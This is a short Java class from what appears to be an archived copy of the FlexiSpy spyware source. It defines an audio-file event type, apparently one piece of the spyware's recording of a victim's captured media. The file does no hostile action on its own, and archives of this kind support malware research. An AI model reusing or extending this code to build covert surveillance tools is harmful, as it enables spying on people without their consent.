/*
  name      FlexiSpy
  type      trojan
  cve       —
  year      unknown
  os        Windows
  authors   unknown
  source    RamadhanAmizudin/malware
  archived  RamadhanAmizudin, krisyotam (2026)
  notes     —
 */
package com.vvt.event;

import net.rim.device.api.util.Persistable;
import com.vvt.event.constant.EventType;

public class FxAudioFileEvent extends FxMediaEvent implements Persistable {
	
	public FxAudioFileEvent() {
		setEventType(EventType.AUDIO);
	}	
}

